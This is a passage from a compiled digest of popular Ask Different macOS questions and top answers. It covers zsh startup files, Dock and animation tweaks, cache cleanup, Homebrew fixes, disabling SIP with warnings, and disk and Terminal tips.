Menu method: It's not part of the Apple menu system to 'cut' files.  The menu Cut option is grayed out, and becomes enabled when text is selected.  But not files. Here is an in-depth discussion on Apple's discussion forum.

---

#### 49. Is it safe to delete ~/Library/Caches?

**问题描述 / Problem Description**:
Tags: macos, hard-drive, file | Score: 211 | Views: 761133 | Answers: 6

**解决方案 / Solution**:
It's generally safe, though a little dangerous depending, to do it but often not worth the effort.
The caches in /System/Library/Caches are generally small and useful, the ones in /Library/Caches are less system caches and much more readily cleared.
If you have a look in ~/Library/Caches you will find a bunch of applications have a cache in there, none of them particularly large though dropbox sometimes has a fair sized cache. This folder can run quite large just because so many apps cache something in there.
If the cache /Library/Caches folder is over 3Gb then you have something that is caching quite a lot. On the three machines I just checked none had a /Library/Caches folder over .75 Gb so I'd go right ahead and remove some of it.
Don't worry about age, I'd worry about size.
In the terminal run the following to sort all of the files in that directory by size (ascending):
du -sh /Library/Caches/* | sort -h

Of course the best way to clear the caches is to install AppleJack and do it with that in single user mode. Doing it with the System fully up can be a little dangerous. If you do it then I'd reboot immediately afterwards.

---

#### 50. ZSH: .zprofile, .zshrc, .zlogin - What goes where?

**问题描述 / Problem Description**:
Tags: macos, zsh, environment-variables | Score: 209 | Views: 274065 | Answers: 1

**解决方案 / Solution**:
This is an attempt to write a canonical QA for this issue, as per the Meta post:  Where is the list of canonical questions stored for Ask Different? I expect it to be periodically edited with the goal of becoming a comprehensive information resource.
What should be used in ZSH on a Mac
I posted a more narrowly scoped question on Unix &amp; Linux and got some clarification on how these files &quot;work.&quot;  Here's the summary of that answer and what I've learned in my research as to what, in my opinion should be used in a ZSH environment on a Mac.

.zprofile
.zlogin and .zprofile are basically the same thing - they set the environment for login shells1; they just get loaded at different times (see below).  .zprofile is based on the Bash's .bash_profile while .zlogin is a derivative of CSH's .login.  Since Bash was the default shell for everything up to Mojave, stick with .zprofile.

.zshrc
This sets the environment for interactive shells2.  This gets loaded after .zprofile.  It's typically a place where you &quot;set it and forget it&quot; type of parameters like $PATH, $PROMPT, aliases, and functions you would like to have in both login and interactive shells.

.zshenv (Optional)
This is read first and read every time.  This is where you set environment variables.  I say this is optional because is geared more toward advanced users where having your $PATH, $PAGER, or $EDITOR variables may be important for things like scripts that get called by launchd.  Those run under a non-interactive shell 3 so anything in .zprofile or .zshrc won't get loaded.  Personally, I don't use this one because I set the PATH variable in my script itself to ensure portability.

.zlogout (Optional)
But very useful!  This is read when you log out of a session and is very good for cleaning things up when you leave (like resetting the Terminal Window Title)


For an excellent, in-depth explanation of what these files do, see What should/shouldn't go in .zshenv, .zshrc, .zlogin, .zprofile, on Unix/Linux.

Some Caveats
Apple does things a little differently so it's best to be aware of this.  Specifically,  Terminal initially opens both a login and interactive shell even though you don't authenticate (enter login credentials).  However, any subsequent shells that are opened are only interactive.
You can test this out by putting an alias or setting a variable in .zprofile, then opening Terminal and seeing if that variable/alias exists.  Then open another shell (type zsh); that variable won't be accessible anymore.
SSH sessions are login and interactive so they'll behave just like your initial Terminal session and read both .zprofile and .zshrc
Order of Operations
This is the order in which these files get read.  Keep in mind that it reads first from the system-wide file (i.e. /etc/zshenv) then from the file in your home directory (~/.zshenv) as it goes through the following order.
.zshenv → .zprofile → .zshrc → .zlogin → .zlogout

1 A login shell is simply a shell, whether local or remote, that allows a user to authenticate to the system.  These shells are typically interactive shells.
2 In interactive mode, they [the shell] accept input typed from the keyboard.  (GNU Bash Reference Manual, 1.2 What is a Shell?)
3 When executing non-interactively, shells execute commands read from a file. (Ibid.)

---

#### 51. Open Finder window from current Terminal location?

**问题描述 / Problem Description**:
Tags: macos, terminal, finder, path | Score: 207 | Views: 83985 | Answers: 7

**解决方案 / Solution**:
Typing open . in Terminal will open the current working directory in a Finder window.

---

#### 52. Need a cli to check the sha256 hash of a file

**问题描述 / Problem Description**:
Tags: macos, command-line, encryption | Score: 205 | Views: 151884 | Answers: 4

**解决方案 / Solution**:
You can use

openssl dgst -sha256 &lt;file&gt;


Tested on LibreSSL 2.6.4 on macOS 10.14 (Mojave).



Prior to Mojave you can use openssl sha -sha256 &lt;file&gt; or openssl sha256 &lt;file&gt;.

To check command line options for the openssl sha command: openssl sha -help.

---

#### 53. How can I make auto-hide/show for the dock faster?

**问题描述 / Problem Description**:
Tags: dock, macos | Score: 204 | Views: 253798 | Answers: 12

**解决方案 / Solution**:
To make the Dock instantly leap back into view when it’s needed, rather than slide, open a Terminal window and type the following:
defaults write com.apple.dock autohide-time-modifier -int 0; killall Dock


I find this useful, but if you’d like the animation for the dock to reappear to last for a split-second, try the following:
defaults write com.apple.dock autohide-time-modifier -float 0.15; killall Dock

To explain, changing &quot;0.15&quot; with any number can let you tailor things as it represents the time in seconds taken for the dock to reappear fully.

To revert back to the default sliding effect, open a Terminal window and type the following:
defaults delete com.apple.dock autohide-time-modifier; killall Dock

---

#### 54. How to move files to trash from command line?

**问题描述 / Problem Description**:
Tags: macos, command-line | Score: 202 | Views: 111071 | Answers: 17

**解决方案 / Solution**:
The trash command line tool can be installed via brew install trash or port install trash.
It allows you to restore trashed files via command line or the Finder.

---

#### 55. Restarting sound service?

**问题描述 / Problem Description**:
Tags: macbook-pro, audio | Score: 202 | Views: 272560 | Answers: 8

**解决方案 / Solution**:
sudo pkill coreaudiod
On older OSes:
You can kill the CoreAudio process by opening Terminal and running:
sudo kill -9 `ps ax|grep 'coreaudio[a-z]' | awk '{print $1}'`

It will restart automatically after a couple seconds.
That fixes some problems my aging MBP has been having, where it sometimes fails to detect headphones or decides the speakers aren't connected. No guarantees it will work for every audio problem, but it's worth a shot.
Source: zakgreant on macosxhints forums.

---

#### 56. How do I disable System Integrity Protection (SIP) AKA &quot;rootless&quot; on macOS?

**问题描述 / Problem Description**:
Tags: macos, sip | Score: 197 | Views: 499215 | Answers: 6

**解决方案 / Solution**:
Note: disabling System Integrity Protection is dangerous, and makes your system more vulnerable to malware.
As Apple puts it in the developer documentation about SIP:

Warning
Disable SIP only temporarily to perform necessary tasks, and reenable it as soon as possible. Failure to reenable SIP when you are done testing leaves your computer vulnerable to malicious code.

If you are simply trying to configure system development tools such as vim, python2, ruby and so on, you almost certainly want to be just installing community-maintained versions from Homebrew and configuring those instead.  The system-provided tools may be convenient to bootstrap, but if you require SIP exceptions for your daily workflow you are almost certainly doing things in a way which will break in a future version of the operating system, and may break applications and other system functionality in the meanwhile.
Valid reasons to disable SIP yourself might be:

if you're doing research on malware yourself in a disposable environment, such as in a macOS virtual machine
if you are attempting to modify core operating system functionality for deployment in a highly-specialized environment such as a public-facing kiosk
if you require a legacy kernel extension such as MacFUSE on an M1 mac

Also important beyond the security implications is the fact that anything you do on a mac with SIP disabled will not work on anyone else's mac unless they also disable it first. If you're developing mac apps, then your system becomes less useful as a testbed because you don't know if your code only works because you hacked your system. If you're developing for another platform such as deployment to a web server, then you can't share your development environment setup with other developers on your team without compromising their security as well.
Here's how to do it if you really need to:
Apple's documentation covers disabling SIP, About System Integrity Protection on your Mac and Configuring System Integrity Protection.
An article on lifehacker.com lists these steps:


Reboot your Mac into Recovery Mode by restarting your computer and holding down Command+R until the Apple logo appears on your screen.
Click Utilities &gt; Terminal.
In the Terminal window, type in csrutil disable and press Enter.
Restart your Mac.


You can verify whether a file or folder is restricted by issuing this ls command using the capital O (and not zero 0) to modify the long listing flag:
ls -lO /System /usr 

Look for the restricted text to indicate where SIP is enforced.
By default (=SIP enabled), the following folders are restricted (see Apple Support page):
/System
/usr
/bin
/sbin
Apps that are pre-installed with OS X

... and the following folders are free:
/Applications
/Library
/usr/local

---

#### 57. Cmd+Tab does not work on hidden or minimized windows

**问题描述 / Problem Description**:
Tags: macos, application-switcher | Score: 192 | Views: 144145 | Answers: 17

**解决方案 / Solution**:
This one is a bit tricky :

press ⌘ Cmd + ⇥ Tab to show your running apps. Keep holding ⌘ Cmd.

press ⇥ Tab until you've selected the app

press the ⌥ Option, and let go of the ⌘ Cmd. 
( You must release ⌘ Cmd after pressing ⌥ Option ! )
( You must release ⌘ Cmd before release ⌥ Option ! )

---

#### 58. Move through images in a folder with Preview.app

**问题描述 / Problem Description**:
Tags: macos, preview | Score: 192 | Views: 200585 | Answers: 12

**解决方案 / Solution**:
If you are just skimming the pictures do this:
Instead of opening a picture in Preview.app by double-clicking it, press space to preview the picture in Quick Look when selected in Finder.

Quick Look offers a fast, full-size preview of nearly any kind of file without opening the file. You can rotate photos, trim audio and video clips, and use Markup — directly in the Quick Look window.
https://support.apple.com/en-gb/guide/mac-help/mh14119/mac

This way you can still use the arrow keys to navigate between the pictures.

↑ and ↓ in list view
↑,↓,← and → in icon view

You can still open the picture in Preview.app when needed (top right corner).

---

#### 59. How to turn off all animations on OS X

**问题描述 / Problem Description**:
Tags: macos | Score: 192 | Views: 194509 | Answers: 6

**解决方案 / Solution**:
I have only enabled the first four of these, but here are all hidden preferences for disabling animations I have found.

# opening and closing windows and popovers
defaults write -g NSAutomaticWindowAnimationsEnabled -bool false

# smooth scrolling
defaults write -g NSScrollAnimationEnabled -bool false

# showing and hiding sheets, resizing preference windows, zooming windows
# float 0 doesn't work
defaults write -g NSWindowResizeTime -float 0.001

# opening and closing Quick Look windows
defaults write -g QLPanelAnimationDuration -float 0

# rubberband scrolling (doesn't affect web views)
defaults write -g NSScrollViewRubberbanding -bool false

# resizing windows before and after showing the version browser
# also disabled by NSWindowResizeTime -float 0.001
defaults write -g NSDocumentRevisionsWindowTransformAnimation -bool false

# showing a toolbar or menu bar in full screen
defaults write -g NSToolbarFullScreenAnimationDuration -float 0

# scrolling column views
defaults write -g NSBrowserColumnAnimationSpeedMultiplier -float 0

# showing the Dock
defaults write com.apple.dock autohide-time-modifier -float 0
defaults write com.apple.dock autohide-delay -float 0

# showing and hiding Mission Control, command+numbers
defaults write com.apple.dock expose-animation-duration -float 0

# showing and hiding Launchpad
defaults write com.apple.dock springboard-show-duration -float 0
defaults write com.apple.dock springboard-hide-duration -float 0

# changing pages in Launchpad
defaults write com.apple.dock springboard-page-duration -float 0

# at least AnimateInfoPanes
defaults write com.apple.finder DisableAllAnimations -bool true

# sending messages and opening windows for replies
defaults write com.apple.Mail DisableSendAnimations -bool true
defaults write com.apple.Mail DisableReplyAnimations -bool true

---

#### 60. Homebrew: Your CLT does not support macOS 11.0

**问题描述 / Problem Description**:
Tags: command-line, homebrew, macos | Score: 191 | Views: 121880 | Answers: 5

**解决方案 / Solution**:
Simplest solution that worked when upgrading to Big Sur. A clean install may not require the solution below. There is inconsistency with the way CLT is upgraded to 12.2.
sudo rm -rf /Library/Developer/CommandLineTools
sudo xcode-select --install

Worked with the following versions (post-install)
❯ /usr/bin/xcodebuild -version
Xcode 12.2
Build version 12B45b

❯ pkgutil --pkg-info=com.apple.pkg.CLTools_Executables
package-id: com.apple.pkg.CLTools_Executables
version: 12.2.0.0.1.1603499215
volume: /
location: /
install-time: 1605632122
groups: com.apple.FindSystemFiles.pkg-group

Big Sur
11.0.1 (20B29)

---

#### 61. Is there a quick way to lock my Mac?

**问题描述 / Problem Description**:
Tags: macos, keyboard, security, screen-lock | Score: 186 | Views: 63048 | Answers: 26

**解决方案 / Solution**:
On macOS High Sierra, there is a standard key sequence and Apple menu item to lock your screen. 


Control-Command-Q or ^+⌘+Q






For older OS, ⇧+⌃+⏏ puts the display (only the display, not the whole computer) to sleep and will then prompt you for a password if you have enabled Require password [amount of time] after sleep or screen saver begins under System Preferences &gt; Security.

If your Mac does not have an &#x23CF; (eject) key, you can use ⇧+⌃+⌽ (power).

---

#### 62. How to fix brew after OSX upgrade to Yosemite?

**问题描述 / Problem Description**:
Tags: macos, homebrew | Score: 183 | Views: 105182 | Answers: 5

**解决方案 / Solution**:
I decided to look this up and found that there is an issue. The issue is closed but it is not possible to simply run brew update because you will still get the same error.

So here is what you need to do:

cd /usr/local/Library
git pull origin master


In case you have changes in the directory (/usr/local/Library), the git pull will throw an error. In that case, you'll have to fetch the master branch and set it forcibly as master:

git fetch --all
git reset --hard origin/master


This will upgrade your homebrew and you can use brew again.

If you installed Homebrew as a non-root user, you'll need to cd to /Users/yourusername/homebrew/Library instead of /usr/local/Library.

---

#### 63. Is there a `lsblk` equivalent for macOS that lists all attached storage devices?

**问题描述 / Problem Description**:
Tags: macos, command-line, hardware, storage | Score: 183 | Views: 480009 | Answers: 6

**解决方案 / Solution**:
diskutil list will list all disks with their identifiers, even if unmounted.

/dev/disk0
   #:                       TYPE NAME                    SIZE       IDENTIFIER
   0:      GUID_partition_scheme                        *251.0 GB   disk0
   1:                        EFI EFI                     209.7 MB   disk0s1
   2:                  Apple_HFS Mac SSD                 150.0 GB   disk0s2
   3:                 Apple_Boot Recovery HD             650.0 MB   disk0s3
   4:       Microsoft Basic Data Windows 8               100.1 GB   disk0s4
/dev/disk1
   #:                       TYPE NAME                    SIZE       IDENTIFIER
   0:     FDisk_partition_scheme                        *500.1 GB   disk1
   1:                  Apple_HFS George Garside          300.2 GB   disk1s1
   2:               Windows_NTFS GRGARSIDE               199.9 GB   disk1s2




For mounted disks only…

To find the raw device name (i.e. /dev/disk0s1) you can run df.

You can limit the results to locally-mounted filesystems, use df -Hl.
This results in a list of partitions and their raw device names, as shown below:

Filesystem     Size   Used  Avail Capacity  iused    ifree %iused  Mounted on
/dev/disk0s2   150G   130G    20G    87% 31761475  4859615   87%   /
/dev/disk0s4   100G    83G    17G    83%   184667 17015601    1%   /Volumes/Windows 8
/dev/disk1s1   300G   282G    19G    94% 68771109  4529660   94%   /Volumes/George Garside
/dev/disk1s2   200G   172G    27G    87%   144125 26731127    1%   /Volumes/GRGARSIDE

---

#### 64. Which OS X Applications do you find indispensable?

**问题描述 / Problem Description**:
Tags: macos, software-recommendation | Score: 180 | Views: 49806 | Answers: 239

**解决方案 / Solution**:
Dropbox
Put your files into your Dropbox on one computer, and they'll be instantly available on any of your other computers that you've installed Dropbox on.

---

#### 65. What tiny thing in Lion makes you smile or has caught you off guard?

**问题描述 / Problem Description**:
Tags: macos | Score: 180 | Views: 56548 | Answers: 107

**解决方案 / Solution**:
Using the FaceTime camera to add signatures to PDFs in Preview. 

Click the annotations button in the toolbar and use the drop down menu next to the signature icon to grab your signature from a piece of paper you have written it on. Then just click and drag in the document to place it. Haven't really needed it yet, but it's implemented so nicely that I did it just for fun.

---

#### 66. Add images to existing PDF with Preview

**问题描述 / Problem Description**:
Tags: macos, photos, pdf, preview | Score: 180 | Views: 327358 | Answers: 9

**解决方案 / Solution**:
Do as follows:

Open the image you want to paste in Preview.app
Select All (Command-A)
Copy (Command-C)
Paste (Command-V)

Now you have a copy of your image pasted above your old image. This is apparently meaningless, but the new copy is not just an image, but an object.

Click on the new image (round blue corners appear, no marching ants)
Copy (Command-C)
Paste on your PDF document. The image is an object, moveable and resizable. The original PDF is still a PDF, editable and all.

---

#### 67. How to arrange two windows easily to left and right side?

**问题描述 / Problem Description**:
Tags: macos, mac, windows, window-manager | Score: 180 | Views: 423807 | Answers: 21

**解决方案 / Solution**:
Original Answer (Update below):
Apple has provided this functionality as part of its OS X El Capitan. Here are the steps:

Click and hold on the green maximize button of an active window (for example, a Safari window);
When the window shrinks slightly and the background becomes highlighted, you’re about to enter Split View, while continuing to hold the green button drag the active window into either the left or right panel to place it full screen there;
As soon as you place the first window into the Split View panel, the other side of the screen turns into a mini-Expose much like Mission Control, simply click the window tile you want to open into Split View for the other side here to immediately send it side by side into Split Full Screen Mode.

The answer has been taken from osxdaily.com website's page.

Update:
Many people commented that they wish there was a shortcut for it. I figured a way to create a shortcut for that from another answer on AskDifferent which I cannot find the link to. This is how:

Open System Preferences;
Go to 'Keyboard' settings;
Go to 'Shortcuts' tab;
In the left pane, select 'App Shortcuts';

In this section you can add app specific shortcuts, as well as shortcuts that you want available for all apps.


Click on the '+' sign below right pane to add a new shortcut;
A new drop down will open. In this drop-down:

In the 'Application:' keep it for 'All Applications';
In the 'Menu Title:' type 'Tile Window to Right of Screen'. Better that you copy-paste it because it has to match letter by letter;
In the 'Keyboard Shortcut:' press the keys you want to use as shortcut for tiling an application window to the right. On my machine, I've set† it to ⎇⌘→.
Repeat the same for tiling to left by putting 'Tile Window to Left of Screen' in the 'Menu Title:' and adding your desired keys for left-tiling shortcut.



You should now have the shortcuts available for any application window that supports tiling. Now, you can press your shortcut keys to tile the first window to left or right. Then the other side will turn into a mini-Expose from which you can select the second window using your mouse.


†I have a dual monitor setup. So other than the one listed above, I have also set the shortcut to move a window to another monitor. The 'Menu Title's are: 
1. &quot;Move to Built-in Retina Display&quot;, with shortcut ⌃⎇⌘→;
2. &quot;Move to LG UltraFine&quot;, with shortcut ⌃⎇⌘←;
To remember the shortcuts, notice that all they keys, are next to each other. All you do is use arrow keys differently. Further, moving to another monitor has an extra key in the shortcut, while putting the windows in split view is on the same monitor, therefore it has one less key.
Hint:
The shortcut name depends on the MacOS system language, e.g.:
english:
'Tile Window to Left of Screen'
german : 'Fenster auf der linken Bildschirmseite anordnen'
or a different title: 'Fenster auf die linke Seite des Bildschirms bewegen'
Phrases for left / right can be found on the green &quot;full screen&quot; button:

---

#### 68. What is the `installd` process, and why is it eating my CPU?

**问题描述 / Problem Description**:
Tags: activity-monitor, macos | Score: 179 | Views: 243455 | Answers: 7

**解决方案 / Solution**:
This is a daemon which is part of PackageKit framework and it's usually running as a background process for the "Software Update" GUI application.
For example, if you open the Software Update application and check for updates, take a look at the Activity Monitor--you'll see the "installd" process doing a bunch of work.

The reason it pegs your CPU is because it must compile the current list of software installed on your computer, and compare with the current version list received from Apple's servers.

You can set the frequency of Software Update checks in System Preferences and Software Update.

The default settings are both to "Check for updates" and "Download updates automatically".
You may adjust either setting, but I would not recommend turning it off altogether.

There's nothing wicked about this process - it's just set to download updates.

You can solve your CPU problem by lowering the priority of the process or by just killing the process in Activity Monitor.



Technical information:

The location in Lion OSX is in:
/System/Library/PrivateFrameworks/PackageKit.framework/Resources/installd

(if you have locate configured correctly, run: locate installd to find the right location).

---

#### 69. What is this qemu-system-aarch64 process and why is it using almost 3 GB of RAM on my M1 Mac

**问题描述 / Problem Description**:
Tags: mac-mini, macos, activity-monitor, apple-silicon | Score: 178 | Views: 155253 | Answers: 3

**解决方案 / Solution**:
This process belongs to an application you've installed yourself.
To find out more, select the process in Activity Monitor and press Cmd-I to open the Process Information window. You should see the name of the process which started it at the top, and the path to the binary itself near the top of the 3rd tab (open files and ports).

---

#### 70. How can I mount an ext4 file system on OS X?

**问题描述 / Problem Description**:
Tags: macos, unix | Score: 178 | Views: 372061 | Answers: 11

**解决方案 / Solution**:
The answer depends on you willingness to invest in commercial software:
If you don’t mind spending some money on a commercial product, Paragon’s extFS for Mac will give you read and write access to ext2 / ext3 / ext4 file systems. The current version supports all versions of OS X / macOS from 10.10 upwards.
If you are looking for a free solution, you can setup a Linux virtual machine, mount your volume(s) there and share it / them via Samba or (S)FTP. This post has some details on how to achieve this using VirtualBox, a free virtual machine application. Note this is not exactly a lightweight solution, even if using a prebuilt VirtualBox VM will spare you installing and configuring a Linux distro from scratch.

---

#### 71. Convert .mov to .mp4

**问题描述 / Problem Description**:
Tags: macos, video, imovie, mp4, mov | Score: 177 | Views: 134269 | Answers: 6

**解决方案 / Solution**:
I personally find using ffmpeg shell program (available through Brew using brew install ffmpeg) the most convenient way to do the conversions.

It includes tons of options for nearly any single thing you could possibly do with a movie.

In your case though, for a conversion, you can simply type:

ffmpeg -i /path/to/input/file /path/to/output.mp4

The .mp4 extension in the output path serves as a cue for the program to do the proper conversion -- no more options are necessary.

---

#### 72. How can I prevent an SSH session from hanging in OS X Terminal?

**问题描述 / Problem Description**:
Tags: macos, terminal, wifi, ssh | Score: 175 | Views: 189533 | Answers: 7

**解决方案 / Solution**:
For keeping the connection alive, you can check in /etc/ssh/ssh_config the line where it says ServerAliveInterval, that tells you how often (in seconds) your computer is gonna send a null packet to keep the connection alive. If you have a 0 in there that indicates that your computer is not trying to keep the connection alive (it is disabled), otherwise it tells you how often (in seconds) it is sending the aforementioned packet. Try putting in 120 or 240, if it is still killing your connection, you can go lower, maybe to 5, if with that number it doesn't happen, maybe it is your router who is dumping the connection to free memory.

For killing it when it gets hang up, you can use the ssh escape character:

~.


That is, press the tilde and then the period, if it doesn't work, press Enter before you press that, that will kill the connection immediately.

---

#### 73. OS X computer name not matching what shows on terminal

**问题描述 / Problem Description**:
Tags: macos, xcode | Score: 174 | Views: 187601 | Answers: 12

**解决方案 / Solution**:
It's perfectly normal for this to occur; when you login Terminal remotely bash does a reverse DNS lookup. It will only be the same if the hostname is not specified on the network you're connecting from and there is no reply from the DHCP server, or the reverse lookup against the remote DNS server fails to resolve.
You can easily over-ride the default setting by using this command in Terminal:
sudo scutil --set HostName archos

You can check it by using:
nslookup nn.nn.nn.nn

( or )
host nn.nn.nn.nn

(where nn signifies your Mac's ip address)

---

#### 74. What happens if you plug more than one charger in the new MacBook Pro (2016)?

**问题描述 / Problem Description**:
Tags: macbook-pro, usb, charger, charging | Score: 173 | Views: 163463 | Answers: 3

**解决方案 / Solution**:
The system will choose the power source that provides the most power, and it will not draw power from the others.
Apple has released a support article (and another one) describing this:


Your MacBook Pro draws power from only one power supply, even if more
than one is attached—so using multiple power supplies will not speed
up charging.

If you connect multiple power supplies to your MacBook
Pro, the one that provides the most power will be used, regardless of
the order in which you connected them.

You should not connect any
power supply that exceeds 100W, as it might damage your Mac.

---

#### 75. How to simulate slow internet connections on the mac

**问题描述 / Problem Description**:
Tags: macos, mac, network, performance, internet | Score: 172 | Views: 179944 | Answers: 10

**解决方案 / Solution**:
Apple’s official tool to slow down the network connections on you Mac for testing purposes is Network Link Conditioner

Additional Tools for Xcode [version].

Additionally, iOS has similar function accessible from within Xcode and iOS 6 or later.

Older versions of Xcode before version 4.3.2 embedded a copy of this tool. This SO thread documents some history of the tool in a similar manner to the iOS simulators and developer documentation.
There are 11 built in profiles from a Lossy Edge network with 400ms delay to a cable modem. If you need other limits, you can create custom profiles with your own settings or you can also use ipfw yourself as described in Craig Hockenberry's article slow ride, make it easy It also mentions the Speed Limit panel by Mike Schrag that is a smaller download than Xcode, but has fewer options than Apple's tool.
It slows down the entire network stack, so you can't throttle on a per app basis without doing things like install lion in a virtual machine and set that VM with a throttled stack.

---

#### 76. Using The Terminal Command to Shutdown, Restart and Sleep My Mac?

**问题描述 / Problem Description**:
Tags: macos, terminal, sleep-wake, shutdown, restart | Score: 172 | Views: 551481 | Answers: 4

**解决方案 / Solution**:
The command you are after is shutdown.
This  informs all users that the machine is going to be shutdown and tells all apps to close files etc.
The command takes a parameter -h, -r or -s to shut down, restart or sleep the Mac.
The command has to be run as root so you need to use sudo.
e.g. to reboot the machine immediately
sudo shutdown -r now

e.g. to shutdown the machine in 60 minutes
sudo shutdown -h +60

From comments there are two things to be addressed
How shutdown works is by sending a sigterm to all processes which should then deal with that e.g. save open files etc. If they don't exit then they will get sent a SIGKILL which forces them to die with no chance to respond. The signals are not sent via the normal key message queue so Apps have to deal with this separately to the code that gets called from quit on the menu. A good app should call common code from both.
This other answer shows how to shutdown as if you hit the menu options. But note that apps can cancel this shutdown

---

#### 77. How to get the chrome tabs to always show when in full screen mode?

**问题描述 / Problem Description**:
Tags: macos, google-chrome, fullscreen, tabs | Score: 170 | Views: 357321 | Answers: 9

**解决方案 / Solution**:
With latest version of Chrome, there is the option to show the Toolbar (which includes tabs) in the View menu.

---

#### 78. Task Switcher moves to non-primary display on Mavericks-Catalina

**问题描述 / Problem Description**:
Tags: macos, display, application-switcher | Score: 170 | Views: 46640 | Answers: 5

**解决方案 / Solution**:
I answered a similar question here - cmd-tab behavior on Mavericks with multiple displays

The Task Switcher does follow the Dock.  If the Dock is on screen 1, the Task Switcher will appear on screen 1.  If the Dock is on screen 3, the Task Switcher will appear on screen 3.  Etc.

To make your Dock appear on a screen you can use a couple of methods.

Method 1 - Move your mouse to the bottom of the desired display.  Don't stop once you reach the bottom of the display though, try to move it further down, as if you're pushing down on the bottom of the display with your cursor.  This action tells the Dock to move to this display.  This is temporary however, meaning the Dock will stay on this display until you perform this action on another display or reboot your Mac.

Method 2 - This will change the default starting point for your Dock.  In System Preferences > Displays > Arrangement you can drag the menu bar from one display to another in this windows display icons.  See the attached picture for reference.  This alters the default preference to always show the Dock on the desired display, the one you drag the menu bar to in this preference pane, when you boot and/or login to your user account.  You can still use method 1 to temporarily change the Dock's location but upon a reboot it will return to the display specified here.

---

#### 79. WindowServer high CPU on Yosemite

**问题描述 / Problem Description**:
Tags: macos, performance | Score: 170 | Views: 188761 | Answers: 11

**解决方案 / Solution**:
I had a similar issue with high cpu usage in WindowServer which I managed to get back to something more normal by removing any items in my menu bar that were making high frequency drawing updates. 

In my case it was the Network Monitor from Little Snitch that seemed to be the biggest culprit.

---

#### 80. Keyboard shortcut to switch focus between multiple displays on OS X 10.9+

**问题描述 / Problem Description**:
Tags: keyboard, display, macos | Score: 170 | Views: 373483 | Answers: 7

**解决方案 / Solution**:
Refer to the original page for detailed solutions and community answers.

---

#### 81. How can I install .pkg with a shell on macOS?

**问题描述 / Problem Description**:
Tags: macos, command-line, install, pkg | Score: 166 | Views: 483177 | Answers: 3

**解决方案 / Solution**:
/usr/sbin/installer

The installer command is used to install Mac OS X installer packages to a specified domain or volume.  The
installer command installs a single package per invocation, which is specified with the -package parameter ( -pkg
is accepted as a synonym).  It may be either a single package or a metapackage.  In the case of the metapackage,
the packages which are part of the default install will be installed unless disqualified by a package's check
tool(s).

See man installer for the full functionality. Often
sudo installer -pkg /path/to/package.pkg -target /

is all that's needed. The target is a &quot;device&quot; (see the man page for details or run installer -dominfo). Here / is the main drive, it also accepts devices like &quot;/Volumes/Macintosh HD&quot;, or /dev/disk0.

---

#### 82. What directory comparison tools can I use on OS X?

**问题描述 / Problem Description**:
Tags: macos, command-line | Score: 164 | Views: 196307 | Answers: 17

**解决方案 / Solution**:
FileMerge (free), shipped with Xcode, offers a directory view.
A command line version is available through the Terminal application opendiff.

Here's how you can compare two directories with FileMerge:


⌘+space, type in "FileMerge" and open it.
Click the "left" button and choose the folder you would like to move items FROM. (The "old" folder)
Click the "right" button and choose the folder you would like to move items TO. ("new" folder) and click "Compare" button
In the right panel, choose to exclude: "identical" and "Changed right". This way you will only see files which are missing in the "new" folder and ignore files your may have added in the "new" folder.
Move files manually in Finder or let FileMerge do it, by choosing an option in the "Merge" dropdown in the right panel.

---

#### 83. Any nice, stable ways to keep a window &#39;Always on top&#39; on the Mac?

**问题描述 / Problem Description**:
Tags: macos, window-manager | Score: 163 | Views: 276780 | Answers: 13

**解决方案 / Solution**:
Refer to the original page for detailed solutions and community answers.

---

#### 84. Change location of macOS Notification Center alerts?

**问题描述 / Problem Description**:
Tags: macos, notifications | Score: 159 | Views: 89318 | Answers: 10

**解决方案 / Solution**:
Unfortunately, you can't change the screen position of the Notification Center Alerts and Banners. This is a huge gripe of mine as well, and I highly encourage you to complain about this issue to Apple here:
http://www.apple.com/feedback/macos.html

Hopefully they will one day change this. I also have not been able to find or formulate any hacks.

I, too, am annoyed by it covering up controls in my modeling applications, tabs in my browser, etc.

You can move the Notification Center to another screen, however your entire menu bar goes with it. When you have more than one monitor active, open up System Preferences > Displays > Arrangement. Click and drag the white bar inside one of the squares representing your current primary monitor and drag it to another monitor.

For notifications that don't need immediate attention, consider changing the alert style from Alerts to Banners. Banners are automatically dismissed into the notification center where you can find them later.

Good luck, and keep spreading the word that we need to tell Apple to make this experience better.

---

#### 85. How to stop OS X from writing Spotlight and Trash files to memory cards and USB sticks?

**问题描述 / Problem Description**:
Tags: macos, photos, usb, spotlight, trash | Score: 158 | Views: 192282 | Answers: 23

**解决方案 / Solution**:
For just a particular mounted volume - like a flash drive called yourUSBstick in this example - these commands will remove existing cruft, stop Spotlight indexing now and in the future, stop the related fsevents logging, and disable the Trash feature.

mdutil -i off /Volumes/yourUSBstick
cd /Volumes/yourUSBstick
rm -rf .{,_.}{fseventsd,Spotlight-V*,Trashes}
mkdir .fseventsd
touch .fseventsd/no_log .metadata_never_index .Trashes
cd -


Other unfamiliar stuff you may still see you probably want to keep, like Apple double "._*" files and other Apple DS cruft relating to icons and window placement.

---

#### 86. How to switch or close the new split Terminal pane?

**问题描述 / Problem Description**:
Tags: macos, terminal | Score: 158 | Views: 154734 | Answers: 3

**解决方案 / Solution**:
The idea behind splitting is that it allows you to keep a certain part of the shell buffer displayed while continuing to enter new commands. So only the lowest split does allow keyboard input. To position the view on the shell buffer use the scroll bar.

You can un-split by pressing Shift-Cmd-D.

---

#### 87. Can home and end keys be mapped when using Terminal?

**问题描述 / Problem Description**:
Tags: macos, terminal, keyboard, command-line, keybindings | Score: 157 | Views: 93737 | Answers: 11

**解决方案 / Solution**:
This can be set in Terminal.app preferences
Context
To answer the one about how to get the beginning or end of the line, it appears that by default Terminal maps these keys to it:

shift+home → beginning of line, equivalent to the &quot;home&quot; key in normal terminals
shift+end → end of line, equivalent to the &quot;end&quot; key in normal terminals

Instructions
If you want home and end to work the &quot;normal&quot; way (and not require shift), go to the Keyboard tab of the Terminal profile preferences:
[Terminal menu] → Preferences → Profiles tab (or settings on some versions of OS X) → Keyboard sub-tab
Then modify/add these keys to be the following &quot;send string to shell&quot;. Use the code for your shell, Bash or Zsh.
macOS changed the default shell from Bash to Zsh in MacOS Catalina (v10.15) and later versions (BigSur and Monterey). The instructions are different for Bash and Zsh.
Zsh

home: \001
end: \005

You can enter these codes in the edit dialog by pressing ctrl-A for \001 and ctrl-E for \005. Thanks to @JW for the Zsh information.
Another, unrelated, option to map home/end keys for MacOS Catalina (v10.15) and later versions (BigSur and Monterey) is to use bindkey widgets:
sudo echo 'bindkey &quot;\033[H&quot; beginning-of-line; bindkey &quot;\033[F&quot; end-of-line' &gt;&gt; ~/.zshrc

Bash

home: \033[H
